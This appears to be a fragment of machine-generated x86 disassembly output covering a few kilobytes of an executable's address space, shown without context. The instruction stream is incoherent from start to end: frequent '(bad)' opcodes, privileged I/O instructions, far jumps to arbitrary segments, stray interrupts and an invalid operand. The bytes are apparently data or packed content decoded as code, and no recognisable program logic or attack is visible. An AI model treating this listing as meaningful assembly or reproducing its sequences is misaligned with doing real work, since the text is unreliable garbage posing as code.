  4151f1:	push   ss
  4151f2:	cli    
  4151f3:	cwde   
  4151f4:	gs pop ds
  4151f6:	(bad)  
  4151f7:	jge    0x41523a
  4151f9:	scas   al,BYTE PTR es:[edi]
  4151fa:	mov    esp,0x393ca1fa
  4151ff:	ins    BYTE PTR es:[edi],dx
  415200:	xchg   ebp,eax
  415201:	stos   DWORD PTR es:[edi],eax
  415202:	sahf   
  415203:	xor    ebx,ebp
  415205:	or     DWORD PTR [ebx-0x8797f29],esi
  41520b:	outs   dx,BYTE PTR ds:[esi]
  41520c:	push   edx
  41520d:	or     eax,0x54281364
  415212:	push   ebp
  415213:	sbb    ebx,DWORD PTR [edx]
  415215:	mov    edi,0xc3c14882
  41521a:	push   edx
  41521b:	pop    esi
  41521c:	lock ret 0xa3c
  415220:	sar    eax,cl
  415222:	mov    dh,0xe7
  415224:	bound  esp,QWORD PTR [edi]
  415226:	pop    ecx
  415227:	stc    
  415228:	xchg   DWORD PTR [esi],ecx
  41522a:	add    DWORD PTR [ebx],ecx
  41522c:	test   DWORD PTR [ebx+0x19929cf3],edx
  415232:	mov    edx,0x70b90218
  415237:	int    0x74
  415239:	sbb    eax,0x8002c604
  41523e:	cwde   
  41523f:	stc    
  415240:	adc    eax,0x2d265a91
  415246:	clc    
  415247:	pop    ss
  415248:	call   0x8dd3:0xe238fc38
  41524f:	lods   eax,DWORD PTR ds:[esi]
  415250:	adc    DWORD PTR [edx-0x69],esi
  415253:	rcl    DWORD PTR [edi+0xe],1
  415256:	rol    esi,cl
  415258:	jge    0x41523b
  41525a:	ja     0x41528e
  41525c:	ror    DWORD PTR [edx],cl
  41525e:	push   eax
  41525f:	jbe    0x4152cf
  415261:	sub    al,0x83
  415263:	lea    ecx,[ebp+0x2ea122f2]
  415269:	sub    edx,ecx
  41526b:	sbb    BYTE PTR ds:0x736d3f3b,ch
  415271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415272:	int3   
  415273:	jp     0x41529a
  415275:	jg     0x41529e
  415277:	out    dx,eax
  415278:	inc    eax
  415279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41527a:	mov    ds:0xda27ecb8,al
  41527f:	fcomp  DWORD PTR [ebp-0x5b]
  415282:	scas   al,BYTE PTR es:[edi]
  415283:	and    eax,0xd073f528
  415288:	push   eax
  415289:	xchg   al,dh
  41528b:	pusha  
  41528c:	popf   
  41528d:	push   esi
  41528e:	inc    edi
  41528f:	sub    ebx,edx
  415291:	mov    eax,0x8f7efffb
  415296:	loope  0x415231
  415298:	in     eax,dx
  415299:	adc    eax,0x55ec9c9c
  41529e:	cmp    edx,DWORD PTR [esi+ebx*4+0x3a]
  4152a2:	int    0x71
  4152a4:	data16 cli 
  4152a6:	mov    WORD PTR [ebx+0x6],fs
  4152a9:	dec    edi
  4152aa:	jae    0x41525e
  4152ac:	jb     0x41530f
  4152ae:	repz pop DWORD PTR [esp+ecx*2+0x70e3e12f]
  4152b6:	jl     0x41529e
  4152b8:	and    DWORD PTR ds:0x3748b3b7,0xfc629dce
  4152c2:	fcomp  st(3)
  4152c4:	mov    al,ds:0xb26ad6cf
  4152ca:	leave  
  4152cb:	(bad)  
  4152cc:	push   ecx
  4152cd:	dec    ebp
  4152ce:	ficom  WORD PTR [edx]
  4152d0:	inc    edx
  4152d1:	add    al,0xbd
  4152d3:	sbb    cl,bl
  4152d5:	cdq    
  4152d6:	adc    al,0xe0
  4152d8:	loope  0x415326
  4152da:	in     al,dx
  4152db:	fistp  QWORD PTR [ecx+0x1b]
  4152de:	push   edx
  4152df:	into   
  4152e0:	fstp   TBYTE PTR [ebx]
  4152e2:	or     esp,DWORD PTR [ebx+0x7904fe79]
  4152e8:	mov    cl,0x8c
  4152ea:	call   0x8b76:0x2e3692f6
  4152f1:	(bad)  
  4152f2:	in     eax,dx
  4152f3:	popa   
  4152f4:	mov    ah,0x89
  4152f6:	nop
  4152f7:	out    dx,eax
  4152f8:	pop    ds
  4152f9:	pop    esi
  4152fa:	mov    ebx,DWORD PTR [ebp-0x33]
  4152fd:	dec    ecx
  4152fe:	(bad)  
  4152ff:	not    BYTE PTR ds:0xa3ef96bc
  415305:	cmp    eax,0xf3c667aa
  41530a:	int3   
  41530b:	pop    ecx
  41530c:	mov    bh,0x35
  41530e:	lea    edi,[ecx+esi*8+0x48]
  415312:	inc    esp
  415313:	mov    edx,0x7fccd521
  415318:	test   BYTE PTR [eax-0xd],al
  41531b:	jns    0x4152fb
  41531d:	jmp    0xfe7fa9f7
  415322:	aaa    
  415323:	cmp    eax,0xe0ee3a1d
  415328:	push   cs
  415329:	nop
  41532a:	rcr    bh,0xfe
  41532d:	add    dl,cl
  41532f:	out    dx,al
  415330:	stos   DWORD PTR es:[edi],eax
  415331:	jns    0x4153a1
  415333:	mov    ds:0x9c7a3db5,al
  415338:	jecxz  0x4152c7
  41533a:	into   
  41533b:	mov    fs,WORD PTR [ebx]
  41533d:	pop    eax
  41533e:	call   esp
  415340:	xchg   edi,eax
  415341:	mov    ds:0x96afc2b2,al
  415346:	add    DWORD PTR [esi+0x53],ebp
  415349:	cmp    al,0x28
  41534b:	lods   eax,DWORD PTR ds:[esi]
  41534c:	push   edx
  41534d:	jbe    0x41534d
  41534f:	test   eax,0x4481bbb9
  415354:	loop   0x41532f
  415356:	in     eax,dx
  415357:	jnp    0x415392
  415359:	fisub  WORD PTR [edx+0x2afbf59e]
  41535f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415360:	test   DWORD PTR [ebp+0x50534e6c],ebx
  415366:	(bad)
  415369:	mov    al,ds:0xdd4e7aba
  41536e:	test   BYTE PTR [ebx],al
  415370:	(bad)  
  415371:	sbb    BYTE PTR [eax],dl
  415373:	cld    
  415374:	sbb    eax,0x47b7e8d0
  415379:	mov    ds:0xe0542817,eax
  41537e:	xor    eax,0xa96aff62
  415383:	inc    ecx
  415384:	xor    cl,dh
  415386:	inc    esi
  415387:	ins    BYTE PTR es:[edi],dx
  415388:	push   edi
  415389:	(bad)  
  41538a:	push   cs
  41538b:	je     0x4153ff
  41538d:	out    dx,al
  41538e:	xchg   edx,eax
  41538f:	arpl   WORD PTR [eax+0x77],dx
  415392:	cli    
  415393:	inc    esi
  415394:	jae    0x415380
  415396:	push   cs
  415397:	lahf   
  415398:	sbb    BYTE PTR [edi],ch
  41539a:	dec    edi
  41539b:	arpl   WORD PTR [eax],ax
  41539d:	add    DWORD PTR [esi+ebx*4+0x5b278c7],0x49
  4153a5:	and    ebp,esi
  4153a7:	stos   DWORD PTR es:[edi],eax
  4153a8:	mov    ebp,0x9811b88c
  4153ad:	test   BYTE PTR [esi-0x3165b120],ch
  4153b3:	in     eax,dx
  4153b4:	sub    BYTE PTR [edi],bl
  4153b6:	cmp    esi,DWORD PTR [eax]
  4153b8:	push   cs
  4153b9:	adc    DWORD PTR [ecx],0xffffffbe
  4153bc:	cmp    al,0x4d
  4153be:	ret    
  4153bf:	in     al,0x4e
  4153c1:	jp     0x415409
  4153c3:	lock imul esp,DWORD PTR [edx],0x86fc85f3
  4153ca:	adc    DWORD PTR [esi+0x574a5771],0x61
  4153d1:	icebp  
  4153d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153d3:	mov    ch,0x97
  4153d5:	test   eax,0x99c873e6
  4153da:	xor    cl,al
  4153dc:	bound  esi,QWORD PTR [edx-0x1423be30]
  4153e2:	shl    DWORD PTR [esp+esi*8],0xed
  4153e6:	add    BYTE PTR [esi],dl
  4153e8:	enter  0x8af6,0x2b
  4153ec:	push   ecx
  4153ed:	sar    DWORD PTR [edi-0x4d509ae1],0x73
  4153f4:	cmp    eax,0xa4bbf507
  4153f9:	sub    esp,DWORD PTR [edi-0x10b7627]
  4153ff:	add    bl,cl
  415401:	(bad)  
  415402:	sub    al,0x14
  415404:	push   ebx
  415405:	pop    esi
  415406:	mov    eax,ds:0xaee14375
  41540b:	push   ecx
  41540c:	mov    ds:0xd961e68d,al
  415411:	mov    esp,0x34c48cbe
  415416:	loopne 0x4153f3
  415418:	les    ebx,FWORD PTR es:[ebp+0x28]
  41541c:	rcr    DWORD PTR [ebp-0x526f810c],1
  415422:	das    
  415423:	push   0x2dec469a
  415428:	inc    esi
  415429:	(bad)  
  41542b:	iret   
  41542c:	fs cmc 
  41542e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41542f:	(bad)  
  415430:	mov    ds:0xad7661c9,eax
  415435:	ds scas eax,DWORD PTR es:[edi]
  415437:	dec    eax
  415438:	pop    esp
  415439:	jmp    0x586e:0xfcaec741
  415440:	ror    DWORD PTR [ecx-0x1cd0feae],1
  415446:	adc    DWORD PTR [edx+eax*4-0x57],0x60eb26d0
  41544e:	inc    edx
  41544f:	pop    ebx
  415450:	mov    esp,0xe087baea
  415455:	in     al,0xe9
  415457:	xor    edi,edi
  415459:	sub    ch,BYTE PTR [edx-0x36ce1301]
  41545f:	fcom   QWORD PTR [edx-0x326943ad]
  415465:	jnp    0x41549c
  415467:	xchg   DWORD PTR [edi-0x17],edx
  41546a:	add    BYTE PTR [eax],cl
  41546c:	mov    ebx,0x6743a18f
  415471:	pop    ebp
  415472:	xchg   esp,eax
  415473:	cmp    DWORD PTR [edi+0x3],edx
  415476:	push   esp
  415477:	scas   eax,DWORD PTR es:[edi]
  415478:	sar    DWORD PTR [edx],0x3c
  41547b:	xchg   ecx,eax
  41547c:	push   es
  41547d:	push   cs
  41547e:	int    0xd3
  415480:	inc    ebp
  415481:	call   0x702e8cbb
  415486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415487:	loop   0x4154a1
  415489:	sub    edx,ebx
  41548b:	test   ecx,0xfa6d072e
  415491:	(bad)  
  415493:	test   ah,ch
  415495:	shl    BYTE PTR [edx],0x14
  415498:	shl    BYTE PTR [edi],1
  41549a:	jb     0x4154ed
  41549c:	hlt    
  41549d:	ret    
  41549e:	cmp    BYTE PTR ds:0xaa0d2691,ah
  4154a4:	int    0xb2
  4154a6:	lods   eax,DWORD PTR ds:[esi]
  4154a7:	test   DWORD PTR [ecx+0x61],ebx
  4154aa:	sbb    eax,0x14487f60
  4154af:	sub    bh,0xdd
  4154b2:	push   0x338d8ce3
  4154b7:	push   edx
  4154b8:	retf   0x81d3
  4154bb:	and    DWORD PTR cs:[eax-0x91d124a],esi
  4154c2:	cld    
  4154c3:	mov    al,ds:0x9882769b
  4154c8:	loop   0x415526
  4154ca:	fcom   QWORD PTR [eax+0x3e1e8640]
  4154d0:	push   ebp
  4154d1:	ret    
  4154d2:	jne    0x415458
  4154d4:	stc    
  4154d5:	cmc    
  4154d6:	mov    edi,0x853d2d97
  4154db:	js     0x41551a
  4154dd:	sub    al,0xb9
  4154df:	fld    TBYTE PTR [edx+0x2cd4a421]
  4154e5:	mov    ch,0xf2
  4154e7:	in     eax,0x60
  4154e9:	adc    al,0x70
  4154eb:	xchg   edx,eax
  4154ec:	shl    DWORD PTR [esi+0x77b29850],cl
  4154f2:	jne    0x415489
  4154f4:	or     DWORD PTR [eax+0x7eef9b5d],0x48
  4154fb:	jbe    0x4154ef
  4154fd:	or     BYTE PTR ds:0xed2bbc13,ch
  415503:	clc    
  415504:	push   ss
  415505:	mov    al,0xcf
  415507:	int3   
  415508:	daa    
  415509:	(bad)  
  41550a:	data16 sahf 
  41550c:	jnp    0x41552f
  41550e:	shl    esp,cl
  415510:	fadd   DWORD PTR [ebp+ebx*8-0x5ee7773a]
  415517:	jmp    0x60a8c178
  41551c:	cwde   
  41551d:	pop    edi
  41551e:	sub    DWORD PTR [eax],0x8
  415521:	pop    ecx
  415522:	pusha  
  415523:	mov    ds:0xc279de48,al
  415528:	loopne 0x41558b
  41552a:	fwait
  41552b:	aam    0xd3
  41552d:	xor    edi,edx
  41552f:	sub    BYTE PTR [eax],dh
  415531:	adc    ah,BYTE PTR [esi-0x6d]
  415534:	push   esp
  415535:	stos   DWORD PTR es:[edi],eax
  415536:	fscale 
  415538:	pop    edx
  415539:	repz add DWORD PTR [edi],ecx
  41553c:	pusha  
  41553d:	and    al,0xa1
  41553f:	jns    0x41553f
  415541:	das    
  415542:	iret   
  415543:	fmul   st,st(2)
  415545:	dec    ebx
  415546:	setl   BYTE PTR [ebx]
  415549:	cdq    
  41554a:	aad    0xf
  41554c:	add    DWORD PTR [ebx],eax
  41554e:	call   0x1e64:0x67017cef
  415555:	ins    BYTE PTR es:[edi],dx
  415556:	bound  ebx,QWORD PTR [ecx]
  415558:	add    DWORD PTR [edx-0x6cc26bff],eax
  41555e:	lea    edi,[edi-0x4f]
  415561:	inc    ebp
  415562:	hlt    
  415563:	aas    
  415564:	shl    DWORD PTR [edi-0x75],cl
  415567:	mov    ah,ah
  415569:	sbb    DWORD PTR ds:0xbcf7ded3,0x3
  415570:	mov    DWORD PTR [ebx],0x688c46ef
  415576:	push   esi
  415577:	push   eax
  415578:	rcr    BYTE PTR [edi],0x4a
  41557b:	dec    esi
  41557c:	mov    WORD PTR [edx+0x57],ss
  41557f:	rcr    ebx,cl
  415581:	push   0x49abad61
  415586:	adc    DWORD PTR [ebx+0x49a007b4],0xffffffb5
  41558d:	xchg   edx,eax
  41558e:	sub    cl,BYTE PTR [ebp+0x5b206399]
  415594:	and    ecx,DWORD PTR [ebx-0x6d]
  415597:	xchg   edx,eax
  415598:	mov    edi,0xdcbd9ab4
  41559d:	cmp    BYTE PTR [edx-0x6e],cl
  4155a0:	pop    esp
  4155a1:	sub    eax,esi
  4155a3:	mov    ebp,0x31b37d40
  4155a8:	sbb    eax,0x19017058
  4155ad:	popa   
  4155ae:	sub    edi,ecx
  4155b0:	retf   
  4155b1:	dec    ecx
  4155b2:	push   ss
  4155b3:	pop    es
  4155b4:	in     eax,dx
  4155b5:	mov    edi,0x4f11fd77
  4155ba:	lods   eax,DWORD PTR ds:[esi]
  4155bb:	popf   
  4155bc:	mov    ecx,0x81728236
  4155c1:	ja     0x41563e
  4155c3:	push   esp
  4155c4:	mov    ch,dh
  4155c6:	xor    bh,ch
  4155c8:	adc    al,0xc7
  4155ca:	popw   ds
  4155cc:	xor    eax,0x4005ef0e
  4155d1:	and    cl,dl
  4155d3:	push   esi
  4155d4:	(bad)  
  4155d5:	(bad)  
  4155d6:	xchg   edi,eax
  4155d7:	pop    esp
  4155d8:	xor    DWORD PTR [ebx-0x3310ce14],ebp
  4155de:	xchg   esi,eax
  4155df:	add    eax,0x77e98011
  4155e4:	adc    BYTE PTR ds:0x7ad5acd6,cl
  4155ea:	imul   di,bx,0x5242
  4155ef:	js     0x41561c
  4155f1:	cmp    DWORD PTR [edi],0x3ea24c23
  4155f7:	jl     0x415613
  4155f9:	mov    edx,0x2eb453ea
  4155fe:	cmp    DWORD PTR [ebx+0x60],ebx
  415601:	mov    eax,ds:0xb5fe63c
  415606:	cld    
  415607:	push   0x1f49b7d6
  41560c:	xor    ah,BYTE PTR [ebx]
  41560e:	scas   eax,DWORD PTR es:[edi]
  41560f:	call   0xc0ca:0x5dbeefa1
  415616:	push   ebx
  415617:	lods   eax,DWORD PTR ds:[esi]
  415618:	jae    0x4155ec
  41561a:	clc    
  41561b:	adc    ecx,ecx
  41561d:	dec    esp
  41561e:	mov    dh,0x2f
  415620:	test   eax,0x66a43ad4
  415625:	(bad)  
  415627:	nop
  415628:	mov    cl,0x4f
  41562a:	int3   
  41562b:	add    ecx,DWORD PTR [edx]
  41562d:	push   0x4b
  41562f:	mov    ds:0x5e0b595c,al
  415634:	(bad)  
  415635:	stos   BYTE PTR es:[edi],al
  415636:	sub    DWORD PTR [edx],ebx
  415638:	fld    QWORD PTR [edx-0x7f8bf1bb]
  41563e:	mov    ecx,0x7a0beed4
  415643:	mov    ecx,0xcc6f1d93
  415648:	adc    al,0xe8
  41564a:	popa   
  41564b:	cdq    
  41564c:	add    DWORD PTR ds:0x6dd23ff0,0x20
  415653:	adc    dl,bl
  415655:	sub    eax,0xbbe14190
  41565a:	test   al,bl
  41565c:	cmp    ah,BYTE PTR [esi]
  41565e:	jns    0x4156a3
  415660:	mov    esi,0xc6f689c6
  415665:	adc    al,0xd
  415667:	mov    ds:0x41f7395b,eax
  41566c:	cdq    
  41566d:	imul   eax,DWORD PTR [ebx-0x22],0xffffffe7
  415671:	test   eax,0xe9029cdb
  415676:	mov    ds:0x6b699bea,al
  41567b:	mov    ds,ebp
  41567d:	pusha  
  41567e:	sahf   
  41567f:	mov    esi,0x8006068d
  415684:	push   0x6c5b33e8
  415689:	fnstcw WORD PTR [ebx]
  41568b:	mov    ?,WORD PTR [edx]
  41568d:	adc    dh,BYTE PTR [ecx-0x36]
  415690:	inc    eax
  415691:	jae    0x415632
  415693:	jb     0x415676
  415695:	adc    BYTE PTR [edx+0x671b25b6],dh
  41569b:	cmp    eax,0x787d8db4
  4156a0:	pop    ds
  4156a1:	push   ds
  4156a2:	nop
  4156a3:	aad    0xb
  4156a5:	aaa    
  4156a6:	les    ebp,FWORD PTR [edi-0x116615a0]
  4156ac:	shr    BYTE PTR [ebx-0x73],0x7a
  4156b0:	outs   dx,BYTE PTR ds:[esi]
  4156b1:	jno    0x415688
  4156b3:	jns    0x41571b
  4156b5:	repz arpl WORD PTR [eax+0x17],sp
  4156b9:	or     al,0x6a
  4156bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156bc:	div    BYTE PTR ds:[esi-0x7a]
  4156c0:	(bad)  
  4156c1:	and    dh,BYTE PTR [eax+0x3f791e71]
  4156c7:	scas   al,BYTE PTR es:[edi]
  4156c8:	mov    bl,0x8a
  4156ca:	das    
  4156cb:	leave  
  4156cc:	lods   al,BYTE PTR ds:[esi]
  4156cd:	mov    ds:0xaac26b43,al
  4156d2:	and    eax,0x6df97148
  4156d7:	lods   al,BYTE PTR ds:[esi]
  4156d8:	push   0xe54a4a66
  4156dd:	inc    ebp
  4156de:	add    DWORD PTR ds:0x7e806ae4,0x95984bb1
  4156e8:	sbb    bh,BYTE PTR [esi+eax*1+0x417277ab]
  4156ef:	mov    cl,0xff
  4156f1:	push   ecx
  4156f2:	fdiv   DWORD PTR [edx]
  4156f4:	add    BYTE PTR [eax-0x7c746fd3],dh
  4156fa:	dec    esi
  4156fb:	jmp    0x38ae:0x4a2f577d
  415702:	dec    ebx
  415703:	jecxz  0x4156ba
  415705:	daa    
  415706:	sahf   
  415707:	mov    esp,0x71552986
  41570c:	in     al,dx
  41570d:	mov    ecx,0x396ebb6a
  415712:	enter  0x8f70,0x87
  415716:	ss das 
  415718:	gs push es
  41571a:	int    0x53
  41571c:	sub    ch,BYTE PTR [esi]
  41571e:	adc    al,0xa2
  415720:	repnz test BYTE PTR [ecx+0x3045fbac],dl
  415727:	or     DWORD PTR [edx],esi
  415729:	repz into 
  41572b:	sahf   
  41572c:	lahf   
  41572d:	mov    ch,0xe8
  41572f:	gs push es
  415731:	dec    ecx
  415732:	and    eax,0xb82bffb2
  415737:	xchg   edi,eax
  415738:	jmp    0xc983d737
  41573d:	cmp    BYTE PTR [ecx+0x75e15233],bl
  415743:	out    0x16,al
  415745:	and    DWORD PTR [esi],ebx
  415747:	mov    ds:0xcb2e9a28,al
  41574c:	loop   0x4156e7
  41574e:	shl    DWORD PTR [esi],0x99
  415751:	mov    ah,BYTE PTR [edx+0x9ede2e1]
  415757:	or     eax,0x18e551f4
  41575c:	lods   al,BYTE PTR ds:[esi]
  41575d:	cmp    al,0xaf
  41575f:	popf   
  415760:	aaa    
  415761:	inc    esi
  415762:	retf   0xd217
  415765:	imul   ecx,DWORD PTR [edx+0x75],0xadc4ab21
  41576c:	je     0x415782
  41576e:	jnp    0x415731
  415770:	fwait
  415771:	mov    eax,ds:0x3b27333
  415776:	adc    DWORD PTR [edi+eax*1],ebp
  415779:	arpl   WORD PTR [esi+eiz*4-0x5f],dx
  41577d:	xor    ebx,0xa9a8032a
  415783:	ss xchg edi,eax
  415785:	push   eax
  415786:	clc    
  415787:	retf   0x6322
  41578a:	shl    BYTE PTR [ebx+0x57],1
  41578d:	jmp    0xbf00:0xd58246b1
  415794:	jb     0x415772
  415796:	cmp    DWORD PTR [eax],esp
  415798:	push   es
  415799:	out    0x2,eax
  41579b:	adc    eax,0x57a125db
  4157a0:	or     al,0x5
  4157a2:	adc    DWORD PTR [ecx+0x46],0x2c
  4157a6:	loope  0x41581d
  4157a8:	je     0x415779
  4157aa:	xchg   ecx,eax
  4157ab:	inc    edx
  4157ac:	aam    0xe9
  4157ae:	popf   
  4157af:	pop    eax
  4157b0:	dec    esp
  4157b1:	or     al,0xa8
  4157b3:	add    DWORD PTR [edx+0x4a46618b],edx
  4157b9:	sub    al,0xc0
  4157bb:	cwde   
  4157bc:	jno    0x4157f8
  4157be:	test   al,0xe7
  4157c0:	inc    ebp
  4157c1:	dec    esi
  4157c2:	test   DWORD PTR [ebp-0x57804e71],esp
  4157c8:	adc    BYTE PTR [eax-0x9f55d81],bh
  4157ce:	mov    edi,0xe5ada1bf
  4157d3:	push   ebp
  4157d4:	jmp    0x41584f
  4157d6:	(bad)  
  4157d7:	fnsave [ebx-0x49e2629]
  4157dd:	outs   dx,BYTE PTR ds:[esi]
  4157de:	ret    
  4157df:	hlt    
  4157e0:	adc    al,0x23
  4157e2:	clc    
  4157e3:	mov    bl,dh
  4157e5:	out    0x51,eax
  4157e7:	jmp    0xc6349a12
  4157ec:	jbe    0x41585a
  4157ee:	test   al,0x89
  4157f0:	jmp    0xe400a514
  4157f5:	jge    0x41579d
  4157f7:	cmp    DWORD PTR [edi+0x4d],edx
  4157fa:	stc    
  4157fb:	or     al,0x27
  4157fd:	pop    ebp
  4157fe:	aaa    
  4157ff:	outs   dx,BYTE PTR ds:[esi]
  415800:	aad    0xa0
  415802:	dec    ebp
  415803:	mov    ebx,0xf16c7880
  415808:	gs addr16 leave 
  41580b:	mov    ah,0x37
  41580d:	xor    ecx,ecx
  41580f:	push   ebp
  415810:	das    
  415811:	nop
  415812:	ret    
  415813:	mov    al,0xfb
  415815:	scas   eax,DWORD PTR es:[edi]
  415816:	xchg   esp,eax
  415817:	pop    ebp
  415818:	lahf   
  415819:	out    0x94,al
  41581b:	cmp    DWORD PTR [esi],edi
  41581d:	stc    
  41581e:	in     eax,0x38
  415820:	shr    DWORD PTR [ecx+0x766f7f8b],cl
  415826:	cmp    DWORD PTR [edx+ebp*4],esi
  415829:	hlt    
  41582a:	ja     0x4157b8
  41582c:	in     al,0x4f
  41582e:	add    DWORD PTR [ecx+eax*4-0x26],0xffffffbd
  415833:	lods   al,BYTE PTR ds:[esi]
  415834:	(bad)  
  415835:	(bad)  
  415836:	adc    BYTE PTR [ebp-0x5],bh
  415839:	mov    ss,WORD PTR [ebp+0x3d00e67d]
  41583f:	push   ss
  415840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415841:	fidiv  DWORD PTR [eax+0x53]
  415844:	sub    BYTE PTR [ebp-0x28],al
  415847:	les    edx,FWORD PTR [ecx+0x1089f889]
  41584d:	punpckhdq mm1,QWORD PTR [eax-0x2cbbbc9]
  415854:	neg    DWORD PTR [ebx+0x655dbd2a]
  41585a:	out    0x14,al
  41585c:	pushf  
  41585d:	test   eax,0xecf6aa55
  415862:	xchg   BYTE PTR [edi+0x43],al
  415865:	outs   dx,BYTE PTR ds:[esi]
  415866:	push   ss
  415867:	adc    edi,edi
  415869:	imul   esi,DWORD PTR [eax+0x12],0x68
  41586d:	adc    DWORD PTR ds:0xeac3849f,0xffffff87
  415874:	sub    esi,DWORD PTR [esi+0x680a7b77]
  41587a:	int3   
  41587b:	or     dh,ah
  41587d:	jnp    0x41581f
  41587f:	and    edx,DWORD PTR [ebp-0x24]
  415882:	xchg   edx,eax
  415883:	repz clc 
  415885:	imul   ecx,esi,0x6a
  415888:	or     DWORD PTR ds:0x37f636db,ebp
  41588e:	in     al,dx
  41588f:	push   ds
  415890:	jns    0x415911
  415892:	mov    ah,0x82
  415894:	aad    0x71
  415896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415897:	popf   
  415898:	test   BYTE PTR [ebx+0x51],bh
  41589b:	inc    ebp
  41589c:	push   0xffffffd8
  41589e:	adc    eax,0xe3dd215b
  4158a3:	inc    eax
  4158a4:	mov    dl,0xab
  4158a6:	mov    ecx,0x286b3e4
  4158ab:	test   al,0xd0
  4158ad:	mov    al,ds:0x3cf8368e
  4158b2:	shl    esi,1
  4158b4:	inc    esp
  4158b5:	dec    eax
  4158b6:	pop    ebx
  4158b7:	mov    ebp,0xe5c38ee
  4158bc:	cmp    BYTE PTR ds:0xd4497974,ch
  4158c2:	sub    eax,0x33b6eb1f
  4158c7:	jb     0x4158f2
  4158c9:	gs dec ebp
  4158cb:	mov    cl,BYTE PTR [ecx+0x380d2c8d]
  4158d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158d2:	xchg   ebx,eax
  4158d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158d4:	dec    esp
  4158d5:	or     edx,DWORD PTR [eax]
  4158d7:	aaa    
  4158d8:	cwde   
  4158d9:	inc    esp
  4158da:	mov    cl,0x30
  4158dc:	ins    DWORD PTR es:[edi],dx
  4158dd:	and    DWORD PTR [edx],0x31df410e
  4158e3:	add    BYTE PTR [edx-0x66],0x17
  4158e7:	popa   
  4158e8:	pop    esp
  4158e9:	mov    bh,0x4f
  4158eb:	adc    eax,0xf984e9f5
  4158f0:	xor    al,0x37
  4158f2:	leave  
  4158f3:	outs   dx,BYTE PTR es:[esi]
  4158f5:	cmp    BYTE PTR ss:[ebx-0x69ddb9df],0xd6
  4158fd:	push   cs
  4158fe:	mov    dl,0xa
  415900:	inc    edx
  415901:	jmp    0xef8cf15b
  415906:	aad    0x13
  415908:	jg     0x4158c5
  41590a:	xchg   ebx,eax
  41590b:	inc    edx
  41590c:	add    al,0x7f
  41590e:	xor    DWORD PTR [ebx+0x2b062bc6],0xd1f35f9b
  415918:	mov    ebp,0x47e48f1d
  41591d:	add    DWORD PTR [esi+0xa],ebp
  415920:	fnsave [edx]
  415922:	xor    BYTE PTR [eax+0x12],dl
  415925:	xchg   esi,eax
  415926:	sub    al,0x73
  415928:	mov    WORD PTR [ebx+ecx*8],cs
  41592b:	mov    dh,0xe4
  41592d:	lods   al,BYTE PTR ds:[esi]
  41592e:	push   esp
  41592f:	mov    edi,DWORD PTR [edi-0x482690c1]
  415935:	jo     0x415906
  415937:	jmp    0x146858c
  41593c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41593d:	call   0x95b4:0xa626006e
  415944:	inc    esi
  415945:	into   
  415946:	(bad)  
  415947:	cs stc 
  415949:	xchg   DWORD PTR [ebx+0x64],ebp
  41594c:	test   BYTE PTR [eax-0x6a863a19],ah
  415952:	and    ebp,eax
  415954:	outs   dx,BYTE PTR ds:[esi]
  415955:	xor    al,0x7c
  415957:	jnp    0x415955
  415959:	lods   eax,DWORD PTR ds:[esi]
  41595a:	dec    esp
  41595b:	or     DWORD PTR [ebx+eax*1+0x39],esi
  41595f:	loop   0x4159a1
  415961:	mov    BYTE PTR [eax+0x5e],bh
  415964:	das    
  415965:	dec    DWORD PTR [edi+esi*4-0x39]
  415969:	pusha  
  41596a:	xor    cl,BYTE PTR [esp+edi*2]
  41596d:	xchg   ebp,eax
  41596e:	stos   BYTE PTR es:[edi],al
  41596f:	push   edx
  415970:	sahf   
  415971:	rcr    BYTE PTR [ecx-0x519e8e67],cl
  415977:	mov    ds:0x5b236101,al
  41597c:	retf   
  41597d:	hlt    
  41597e:	sar    DWORD PTR [eax],0x52
  415981:	loope  0x4159f4
  415983:	xor    eax,0xc3087e59
  415988:	int    0x31
  41598a:	hlt    
  41598b:	xor    ebp,esp
  41598d:	mov    ch,0xd8
  41598f:	imul   ecx,DWORD PTR [edx],0xbe5cf761
  415995:	jbe    0x4159fb
  415997:	and    DWORD PTR [eax],edx
  415999:	push   esp
  41599a:	retf   
  41599b:	xor    ebp,edx
  41599d:	stc    
  41599e:	mov    ds,ebp
  4159a0:	inc    ecx
  4159a1:	fadd   QWORD PTR [ecx]
  4159a3:	pop    ds
  4159a4:	fwait
  4159a5:	push   0x5c
  4159a7:	adc    esi,esp
  4159a9:	sbb    al,0x71
  4159ab:	mov    dh,0xfd
  4159ad:	push   cs
  4159ae:	sbb    al,0x4d
  4159b0:	and    ch,BYTE PTR [edi]
  4159b2:	jnp    0x415a11
  4159b4:	xor    eax,0x1242beb6
  4159b9:	sub    DWORD PTR [edx+edx*4+0x6e47fe30],0x6f71454d
  4159c4:	arpl   ax,sp
  4159c6:	addr16 leave 
  4159c8:	mov    ecx,0x71280bf7
  4159cd:	je     0x415950
  4159cf:	enter  0x999f,0xb4
  4159d3:	mov    dl,ch
  4159d5:	hlt    
  4159d6:	enter  0xcb63,0xda
  4159da:	cwde   
  4159db:	sbb    al,0x36
  4159dd:	and    DWORD PTR [edx],esp
  4159df:	jo     0x4159dd
  4159e1:	iret   
  4159e2:	sub    eax,0xc1289e80
  4159e7:	(bad)  
  4159e8:	lods   al,BYTE PTR ds:[esi]
  4159e9:	jno    0x4159fc
  4159eb:	scas   al,BYTE PTR es:[edi]
  4159ec:	test   BYTE PTR [ecx],0xfb
  4159ef:	shl    DWORD PTR [ecx+0x3e],0x41
  4159f3:	call   0x9789195c
  4159f8:	aaa    
  4159f9:	ror    BYTE PTR [esi+0x24],1
  4159fc:	jb     0x415993
  4159fe:	mov    dl,0xac
  415a00:	xor    al,cl
  415a02:	inc    ebx
  415a03:	mov    eax,ds:0x32ed7536
  415a08:	(bad)  
  415a0a:	mov    ah,0x67
  415a0c:	push   ecx
  415a0d:	in     eax,0x6b
  415a0f:	xchg   edi,edi
